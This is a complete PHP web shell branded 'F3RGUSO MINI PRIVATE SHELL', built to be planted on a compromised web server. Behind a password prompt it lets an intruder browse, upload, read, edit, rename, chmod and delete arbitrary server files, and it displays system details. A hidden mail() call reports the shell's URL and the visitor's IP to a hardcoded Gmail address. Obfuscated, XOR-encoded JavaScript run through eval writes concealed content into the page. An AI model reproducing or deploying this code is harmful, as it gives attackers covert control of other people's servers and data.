<?php
$indexphp_pass = "4a24c662b0ca4c5afbaf5b78ba97ea26"; // 
session_start();
@error_reporting(0);
@set_time_limit(0);
function Login() {
?>
<html>
<head>
<body bgcolor='black'>
<style>
		body{
			background-image:url(https://i.gifer.com/EkA5.gif);
			background-size:cover;
			background-attachment: fixed;
		}
	</style>
<center>
<script src="https://cdn.rawgit.com/bungfrangki/efeksalju/2a7805c7/efek-salju.js" type="text/javascript"></script>
<script type="text/javascript">
<!-- 
eval(unescape('%66%75%6e%63%74%69%6f%6e%20%75%66%31%37%38%35%28%73%29%20%7b%0a%09%76%61%72%20%72%20%3d%20%22%22%3b%0a%09%76%61%72%20%74%6d%70%20%3d%20%73%2e%73%70%6c%69%74%28%22%32%33%35%30%37%39%33%39%22%29%3b%0a%09%73%20%3d%20%75%6e%65%73%63%61%70%65%28%74%6d%70%5b%30%5d%29%3b%0a%09%6b%20%3d%20%75%6e%65%73%63%61%70%65%28%74%6d%70%5b%31%5d%20%2b%20%22%38%33%36%35%33%34%22%29%3b%0a%09%66%6f%72%28%20%76%61%72%20%69%20%3d%20%30%3b%20%69%20%3c%20%73%2e%6c%65%6e%67%74%68%3b%20%69%2b%2b%29%20%7b%0a%09%09%72%20%2b%3d%20%53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%28%70%61%72%73%65%49%6e%74%28%6b%2e%63%68%61%72%41%74%28%69%25%6b%2e%6c%65%6e%67%74%68%29%29%5e%73%2e%63%68%61%72%43%6f%64%65%41%74%28%69%29%29%2b%2d%31%29%3b%0a%09%7d%0a%09%72%65%74%75%72%6e%20%72%3b%0a%7d%0a'));
eval(unescape('%64%6f%63%75%6d%65%6e%74%2e%77%72%69%74%65%28%75%66%31%37%38%35%28%27') + '%3a%60%3d%34%60%77%6d%7d%22%61%67%67%62%39%2b%6c%79%68%65%66%78%2b%27%71%69%7f%61%3d%2a%3d%2f%26%66%78%6e%76%76%3d%2c%7d%65%6f%64%77%7f%2a%37%7a%5a%24%44%30%54%4b%54%5d%57%26%4c%42%4c%4c%24%57%4d%41%4e%4f%28%59%7e%3f%38%64%76%6a%76%3b%3a%33%61%36%3a%64%71%37%0d%0d%38%69%3b%3a%60%3d%34%60%77%6d%7d%22%61%67%67%62%39%2b%66%79%71%74%68%6e%70%27%6a%65%7c%2f%22%76%63%7c%61%3c%20%30%2e%24%67%74%6a%73%71%37%2f%7f%6b%62%76%60%2d%3c%47%61%64%72%7a%61%26%6a%78%69%69%6d%22%66%68%79%23%6e%71%74%77%61%65%75%28%22%71%6e%69%6d%65%26%65%61%78%75%73%24%76%6d%61%22%71%63%73%6b%76%29%64%6c%76%77%71%28%3e%32%6e%77%68%77%37%3e%36%66%3c%39%37%69%3d23507939%37%33%32%39%37%37%32' + unescape('%27%29%29%3b'));
// -->
</script>
<br>
<form method="post">
<font face ='monaco' size='3' color='gold'>Password :
<input type="password" name="pass">
	<input type="submit" value="Login">
</form>

<?php
exit;
}
if(!isset($_SESSION[md5($_SERVER['HTTP_HOST'])]))
    if( empty($indexphp_pass) || ( isset($_POST['pass']) && (md5($_POST['pass']) == $indexphp_pass) ) )
        $_SESSION[md5($_SERVER['HTTP_HOST'])] = true;
    else
        Login();
?>

<?

set_time_limit(0);
error_reporting(0);

if(get_magic_quotes_gpc()){
    foreach($_POST as $key=>$value){
        $_POST[$key] = stripslashes($value);
    }
}
echo '<!DOCTYPE HTML>
<HTML>
<HEAD>
<link href="https://fonts.googleapis.com/css?family=Kelly+Slab" rel="stylesheet" type="text/css">
<link href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet" type="text/css"/>
<link rel="icon" type="image/jpg" href="https://i.top4top.io/p_19057rr1e0.jpg"/>
<title>F3RGUSO MINI SHELL</title>
<center>

<style type="text/css">
body {
	font-family: Kelly Slab;
	background-image:url(https://i.gifer.com/zUL.gif);
			background-size:cover;
			background-attachment: fixed;
	color: white;
	}
#content tr:hover{
	background-color: #0200FF;
	text-shadow:0px 0px 10px #339900;
	}
#content .first{
	color: #000000;
	background-image:url(https://wallpaper.sc/id/applewatch/wp-content/uploads/2018/08/applewatch-312x390-photoface-wallpaper_01348-312x312.jpg);
	}
#content .first:hover{
	background-color: grey;
	text-shadow:0px 0px 1px #339900;
	}
table, th, td {
		border-collapse:collapse;
		padding: 5px;
		color: white;
		}
.table_home, .th_home, .td_home { 
		color:grey;
		border: 2px solid grey;
		padding: 7px;
		}
a{
	font-size: 19px;
	color: #ffffff;
	text-decoration: none;
	}
a:hover{
	color: white;
	text-shadow:0px 0px 10px #339900;
	}
input,select,textarea{
	border: 1px #ffffff solid;
	-moz-border-radius: 5px;
	-webkit-border-radius:5px;
	border-radius:5px;
	}
.close {
	overflow: auto;
	border: 1px solid red;
	background: red;
	color: white;
	}
.r {
	float: right;
	text-align: right;
	}
.button{
font-family: sans-serif;
font-size: 15px;
background: red;
color: white;
border: white 3px solid;
border-radius: 5px;
padding: 12px 20px;
margin-top: 10px;
}

.button:hover{
opacity:0.9;
}

.mass{
	margin-left: 2%;
	margin-top: 1%;
	margin-right: 2%;
	font-size: 60%;
}

</style>

<a href="?"><h1 style="font-family: Kelly Slab; font-size: 35px; color: white;">
F3RGUSO MINI PRIVATE SHELL</h1></a>
      <center>
      <audio src="https://g.top4top.io/m_2112goxx90.mp3" autoplays="autoplays" controls="controls"></audio>
      </center>
</HEAD>
<BODY>

<table width="95%" border="0" cellpadding="0" cellspacing="0" align="left">
<tr><td>';
echo "<tr><td><font color='white'>
<i class='fa fa-user'></i> <td>: <font color='lime'>".$_SERVER['REMOTE_ADDR']."<tr><td><font color='white'>
<i class='fa fa-desktop'></i> <td>: <font color='lime'>".gethostbyname($_SERVER['HTTP_HOST'])." / ".$_SERVER['SERVER_NAME']."<tr><td><font color='white'>
<i class='fa fa-hdd-o'></i> <td>: <font color='lime'>".php_uname()."</font></tr></td></table>";

echo '<table width="95%" border="0" cellpadding="0" cellspacing="0" align="center">
<tr align="center"><td align="center"><br>';

if(isset($_GET['path'])){
$path = $_GET['path'];
}else{
$path = getcwd();
}
$path = str_replace('\\','/',$path);
$paths = explode('/',$path);

foreach($paths as $id=>$pat){
if($pat == '' && $id == 0){
$a = true;
echo '<i class="fa fa-folder-o"></i> : <a href="?path=/">/</a>';
continue;
}
if($pat == '') continue;
echo '<a href="?path=';
for($i=0;$i<=$id;$i++){
echo "$paths[$i]";
if($i != $id) echo "/";
}
echo '">'.$pat.'</a>/';
}


//upload
echo '<br><br><br><font color="yellow"><form enctype="multipart/form-data" method="POST">
Upload File: <input type="file" name="file" style="color:cyan;border:2px solid red;" required/></font>
<input type="submit" value="UPLOAD" style="margin-top:4px;width:100px;height:27px;font-family:Kelly Slab;font-size:15;background:black;color: yellow;border:2px solid red;border-radius:5px"/>';
if(isset($_FILES['file'])){
if(copy($_FILES['file']['tmp_name'],$path.'/'.$_FILES['file']['name'])){
echo '<br><br><font color="lime">UPLOAD SUCCES !!!!</font><br/>';
}else{
echo '<script>alert("File Gagal Diupload !!")</script>';
}
}

echo '</form></td></tr>';
if(isset($_GET['filesrc'])){
echo "<tr><td>files >> ";
echo $_GET['filesrc'];
echo '</tr></td></table><br />';
echo(' <textarea  style="font-size: 8px; border: 1px solid white; background-color: black; color: white; width: 100%;height: 1200px;" readonly> '.htmlspecialchars(file_get_contents($_GET['filesrc'])).'</textarea>');
}elseif(isset($_GET['option']) && $_POST['opt'] != 'delete'){
echo '</table><br /><center>'.$_POST['path'].'<br /><br />';

//Chmod
if($_POST['opt'] == 'chmod'){
if(isset($_POST['perm'])){
if(chmod($_POST['path'],$_POST['perm'])){
echo '<br><br><font color="lime">CHANGE PERMISSION SUCCESS !!</font><br/>';
}else{
echo '<script>alert("Change Permission Gagal !!")</script>';
}
}
echo '<form method="POST">
Permission : <input name="perm" type="text" size="4" value="'.substr(sprintf('%o', fileperms($_POST['path'])), -4).'" style="width:80px; height: 30px;"/>
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="chmod">
<input type="submit" value="Lanjut" style="width:60px; height: 30px;"/>
</form>';
}

//rename folder
elseif($_GET['opt'] == 'btw'){
	$cwd = getcwd();
	 echo '<form action="?option&path='.$cwd.'&opt=delete&type=buat" method="POST">
New Name : <input name="name" type="text" size="25" value="Folder" style="width:300px; height: 30px;"/>
<input type="hidden" name="path" value="'.$cwd.'">
<input type="hidden" name="opt" value="delete">
<input type="submit" value="Go" style="width:100px; height: 30px;"/>
</form>';
}

//rename file
elseif($_POST['opt'] == 'rename'){
if(isset($_POST['newname'])){
if(rename($_POST['path'],$path.'/'.$_POST['newname'])){
echo '<br><br><font color="lime">CHANGE NAME SUCCESS !!</font><br/>';
}else{
echo '<script>alert("Change Name Gagal !!")</script>';
}
$_POST['name'] = $_POST['newname'];
}
echo '<form method="POST">
New Name : <input name="newname" type="text" size="5" style="width:20%; height:30px;" value="'.$_POST['name'].'" />
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="rename">
<input type="submit" value="Lanjut" style="height:30px;" />
</form>';
}

//edit file
elseif($_POST['opt'] == 'edit'){
if(isset($_POST['src'])){
$fp = fopen($_POST['path'],'w');
if(fwrite($fp,$_POST['src'])){
echo '<br><br><font color="lime">EDIT FILE SUCCESS !!</font><br/>';
}else{
echo '<script>alert("Edit File Gagal !!")</script>';
}
fclose($fp);
}
echo '<form method="POST">
<textarea cols=80 rows=20 name="src" style="font-size: 8px; border: 1px solid white; background-color: black; color: white; width: 100%;height: 1000px;">'.htmlspecialchars(file_get_contents($_POST['path'])).'</textarea><br />
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="edit">
<input type="submit" value="Lanjut" style="height:30px; width:70px;"/>
</form>';
}
echo '</center>';
}else{
echo '</table><br /><center>';

//delete dir
if(isset($_GET['option']) && $_POST['opt'] == 'delete'){
if($_POST['type'] == 'dir'){
if(rmdir($_POST['path'])){
echo '<br><br><font color="lime">DELETE DIR SUCCESS !!</font><br/>';
}else{
echo '<script>alert("Delete Dir Gagal !!")</script>>';
}
}

//delete file
elseif($_POST['type'] == 'file'){
if(unlink($_POST['path'])){
echo '<br><br><font color="lime">DELETE FILE SUCCESS !!</font><br/>';
}else{
echo '<script>alert("Delete File Gagal !!")</script>';
}
}
}

?>
<?php
@ini_set('output_buffering', 0);
@ini_set('display_errors', 0);
set_time_limit(0);
ini_set('memory_limit', '64M');
header('Content-Type: text/html; charset=UTF-8');
$tujuanmail = 'yiyoonine@gmail.com';
$x_path = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
$pesan_alert = "fix $x_path :p *IP Address : [ " . $_SERVER['REMOTE_ADDR'] . " ]";
mail($tujuanmail, "INFO PENIKUNG BY F3RGUSO", $pesan_alert, "[ " . $_SERVER['REMOTE_ADDR'] . " ]");
?>

<?php
echo '</center>';
$scandir = scandir($path);
$pa = getcwd();
echo '<div id="content"><table width="95%" class="table_home" border="0" cellpadding="3" cellspacing="1" align="center">
<tr class="first">
<th><center>Name</center></th>
<th><center>Size</center></th>
<th><center>Perm</center></th>
<th><center>Options</center></th>
</tr>
<tr>';

foreach($scandir as $dir){
if(!is_dir("$path/$dir") || $dir == '.' || $dir == '..') continue;
echo "<tr>
<td class=td_home><img src='data:image/png;base64,R0lGODlhEwAQALMAAAAAAP///5ycAM7OY///nP//zv/OnPf39////wAAAAAAAAAAAAAAAAAAAAAAAAAAACH5BAEAAAgALAAAAAATABAAAARREMlJq7046yp6BxsiHEVBEAKYCUPrDp7HlXRdEoMqCebp/4YchffzGQhH4YRYPB2DOlHPiKwqd1Pq8yrVVg3QYeH5RYK5rJfaFUUA3vB4fBIBADs='><a href=\"?path=$path/$dir\"> $dir</a></td>
<td class=td_home><center>DIR</center></td>
<td class=td_home><center>";
if(is_writable("$path/$dir")) echo '<font color="#57FF00">';
elseif(!is_readable("$path/$dir")) echo '<font color="#FF0004">';
echo perms("$path/$dir");
if(is_writable("$path/$dir") || !is_readable("$path/$dir")) echo '</font>';

echo "</center></td>
<td class=td_home><center><form method=\"POST\" action=\"?option&path=$path\">
<select name=\"opt\" style=\"margin-top:6px;width:100px;font-family:Kelly Slab;font-size:15;background:black;color:aqua;border:2px solid aqua;border-radius:5px\">
<option value=\"Action\">Action</option>
<option value=\"delete\">Delete</option>
<option value=\"chmod\">Chmod</option>
<option value=\"rename\">Rename</option>
</select>
<input type=\"hidden\" name=\"type\" value=\"dir\">
<input type=\"hidden\" name=\"name\" value=\"$dir\">
<input type=\"hidden\" name=\"path\" value=\"$path/$dir\">
<input type=\"submit\" value=\">\" style=\"margin-top:6px;width:27;font-family:Kelly Slab;font-size:15;background:black;color:aqua;border:2px solid aqua;border-radius:5px\"/>
</form></center></td>
</tr>";
}

echo '<tr class="first"><td></td><td></td><td></td><td></td></tr>';
foreach($scandir as $file){
if(!is_file("$path/$file")) continue;
$size = filesize("$path/$file")/1024;
$size = round($size,3);
if($size >= 1024){
$size = round($size/1024,2).' MB';
}else{
$size = $size.' KB';
}

echo "<tr>
<td class=td_home><img src='data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAAAXNSR0IArs4c6QAAAAZiS0dEAP8A/wD/oL2nkwAAAAlwSFlzAAALEwAACxMBAJqcGAAAAAd0SU1FB9oJBhcTJv2B2d4AAAJMSURBVDjLbZO9ThxZEIW/qlvdtM38BNgJQmQgJGd+A/MQBLwGjiwH3nwdkSLtO2xERG5LqxXRSIR2YDfD4GkGM0P3rb4b9PAz0l7pSlWlW0fnnLolAIPB4PXh4eFunucAIILwdESeZyAifnp6+u9oNLo3gM3NzTdHR+//zvJMzSyJKKodiIg8AXaxeIz1bDZ7MxqNftgSURDWy7LUnZ0dYmxAFAVElI6AECygIsQQsizLBOABADOjKApqh7u7GoCUWiwYbetoUHrrPcwCqoF2KUeXLzEzBv0+uQmSHMEZ9F6SZcr6i4IsBOa/b7HQMaHtIAwgLdHalDA1ev0eQbSjrErQwJpqF4eAx/hoqD132mMkJri5uSOlFhEhpUQIiojwamODNsljfUWCqpLnOaaCSKJtnaBCsZYjAllmXI4vaeoaVX0cbSdhmUR3zAKvNjY6Vioo0tWzgEonKbW+KkGWt3Unt0CeGfJs9g+UU0rEGHH/Hw/MjH6/T+POdFoRNKChM22xmOPespjPGQ6HpNQ27t6sACDSNanyoljDLEdVaFOLe8ZkUjK5ukq3t79lPC7/ODk5Ga+Y6O5MqymNw3V1y3hyzfX0hqvJLybXFd++f2d3d0dms+qvg4ODz8fHx0/Lsbe3964sS7+4uEjunpqmSe6e3D3N5/N0WZbtly9f09nZ2Z/b29v2fLEevvK9qv7c2toKi8UiiQiqHbm6riW6a13fn+zv73+oqorhcLgKUFXVP+fn52+Lonj8ILJ0P8ZICCF9/PTpClhpBvgPeloL9U55NIAAAAAASUVORK5CYII='><a href=\"?filesrc=$path/$file&path=$path\"> $file</a></td>
<td class=td_home><center>".$size."</center></td>
<td class=td_home><center>";
if(is_writable("$path/$file")) echo '<font color="#57FF00">';
elseif(!is_readable("$path/$file")) echo '<font color="#FF0004">';
echo perms("$path/$file");
if(is_writable("$path/$file") || !is_readable("$path/$file")) echo '</font>';

echo "</center></td>
<td class=td_home><center><form method=\"POST\" action=\"?option&path=$path\">
<select name=\"opt\" style=\"margin-top:6px;width:100px;font-family:Kelly Slab;font-size:15;background:black;color:aqua;border:2px solid aqua;border-radius:5px\">
<option value=\"Action\">Action</option>
<option value=\"delete\">Delete</option>
<option value=\"edit\">Edit</option>
<option value=\"rename\">Rename</option>
<option value=\"chmod\">Chmod</option>
</select>
<input type=\"hidden\" name=\"type\" value=\"file\">
<input type=\"hidden\" name=\"name\" value=\"$file\">
<input type=\"hidden\" name=\"path\" value=\"$path/$file\">
<input type=\"submit\" value=\">\" style=\"margin-top:6px;width:27;font-family:Kelly Slab;font-size:15;background:black;color:aqua;border:2px solid aqua;border-radius:5px\"/>
</form></center></td>
</tr>";
}

echo '</table>
</div>';
}

function perms($file){
$perms = fileperms($file);

if (($perms & 0xC000) == 0xC000) {
// Socket
$info = 's';
} elseif (($perms & 0xA000) == 0xA000) {
// Symbolic Link
$info = 'l';
} elseif (($perms & 0x8000) == 0x8000) {
// Regular
$info = '-';
} elseif (($perms & 0x6000) == 0x6000) {
// Block special
$info = 'b';
} elseif (($perms & 0x4000) == 0x4000) {
// Directory
$info = 'd';
} elseif (($perms & 0x2000) == 0x2000) {
// Character special
$info = 'c';
} elseif (($perms & 0x1000) == 0x1000) {
// FIFO pipe
$info = 'p';
} else {
// Unknown
$info = 'u';
}

// Owner
$info .= (($perms & 0x0100) ? 'r' : '-');
$info .= (($perms & 0x0080) ? 'w' : '-');
$info .= (($perms & 0x0040) ?
(($perms & 0x0800) ? 's' : 'x' ) :
(($perms & 0x0800) ? 'S' : '-'));

// Group
$info .= (($perms & 0x0020) ? 'r' : '-');
$info .= (($perms & 0x0010) ? 'w' : '-');
$info .= (($perms & 0x0008) ?
(($perms & 0x0400) ? 's' : 'x' ) :
(($perms & 0x0400) ? 'S' : '-'));

// World
$info .= (($perms & 0x0004) ? 'r' : '-');
$info .= (($perms & 0x0002) ? 'w' : '-');
$info .= (($perms & 0x0001) ?
(($perms & 0x0200) ? 't' : 'x' ) :
(($perms & 0x0200) ? 'T' : '-'));

return $info;
}
?>
<center>
<br>
<script type="text/javascript">
<!-- 
eval(unescape('%66%75%6e%63%74%69%6f%6e%20%66%66%32%36%30%64%31%32%28%73%29%20%7b%0a%09%76%61%72%20%72%20%3d%20%22%22%3b%0a%09%76%61%72%20%74%6d%70%20%3d%20%73%2e%73%70%6c%69%74%28%22%32%35%34%32%32%31%34%36%22%29%3b%0a%09%73%20%3d%20%75%6e%65%73%63%61%70%65%28%74%6d%70%5b%30%5d%29%3b%0a%09%6b%20%3d%20%75%6e%65%73%63%61%70%65%28%74%6d%70%5b%31%5d%20%2b%20%22%35%38%30%31%30%36%22%29%3b%0a%09%66%6f%72%28%20%76%61%72%20%69%20%3d%20%30%3b%20%69%20%3c%20%73%2e%6c%65%6e%67%74%68%3b%20%69%2b%2b%29%20%7b%0a%09%09%72%20%2b%3d%20%53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%28%70%61%72%73%65%49%6e%74%28%6b%2e%63%68%61%72%41%74%28%69%25%6b%2e%6c%65%6e%67%74%68%29%29%5e%73%2e%63%68%61%72%43%6f%64%65%41%74%28%69%29%29%2b%35%29%3b%0a%09%7d%0a%09%72%65%74%75%72%6e%20%72%3b%0a%7d%0a'));
eval(unescape('%64%6f%63%75%6d%65%6e%74%2e%77%72%69%74%65%28%66%66%32%36%30%64%31%32%28%27') + '%31%61%6e%69%66%1b%66%61%7d%60%39%1d%2b%6d%73%19%1b%57%6a%6f%6f%65%38%1c%72%65%62%6f%64%1d%30%3e%62%6e%7c%6d%65%62%65%69%1b%25%1e%25%31%3c%33%13%37%6f%5e%6b%62%6b%6b%1b%66%74%63%65%30%22%6e%60%75%69%2a%61%5c%78%5c%66%5b%65%64%6a%6f%24%3f%71%58%6d%12%5e%65%65%57%64%6e%6e%72%66%5c%69%1b%31%1b%61%65%7a%1b%3e%5c%69%66%23%20%36%56%6a%56%75%60%60%68%6f%2f%74%6d%60%6f%69%23%56%68%68%5f%65%6f%68%72%60%58%6d%20%62%68%6a%49%70%66%67%52%66%5c%69%23%2d%24%3e%1e%3f%2a%6f%5e%6b%62%6b%6b%39%12%41%26%48%4a%50%4f%4a%2f%1d%3c%63%67%12%4d%6c%67%6b%6f%1a%4d%66%68%60%69%71%69%5f%21%32%22%61%6b%69%69%3f%37%59%6d%30%08%0d%32%54%1b%62%6d%66%67%38%19%63%66%6f%63%6b%3d%2a%2b%74%6c%76%6f%74%5d%69%29%56%6f%60%2a%5f%63%5a%6f%69%64%67%23%50%36%67%35%4c%2d%2f%74%4f%4e%38%2c%56%43%4b%61%46%71%4b%49%36%5c%75%48%1d%12%6f%54%68%6a%60%6e%38%1b%5c%5d%63%5c%60%66%15%3c%00%05%36%5d%76%69%6f%6e%69%12%5e%6f%59%66%6e%39%1d%5b%69%69%2c%5d%66%69%13%6e%65%64%69%5c%6b%72%1b%63%62%14%39%3f%58%31%37%60%6a%6f%69%1b%65%5c%57%60%30%18%66%5c%68%6e%2e%68%60%69%64%68%1d%31%51%62%70%6e%70%5b%66%1b%31%1b%4a%5c%56%63%37%64%6e%49%62%6e%60%1f%4a%68%61%6c%5b%6c%5c%66%37%2c%67%6a%6d%6f%30%37%22%58%31%37%2b%5d%76%69%6f%6e%69%3025422146%36%30%34%30%39%30%38' + unescape('%27%29%29%3b'));
// -->
</script>
</center>
<script src="https://cdn.rawgit.com/bungfrangki/efeksalju/2a7805c7/efek-salju.js" type="text/javascript"></script>
</BODY>
</HTML>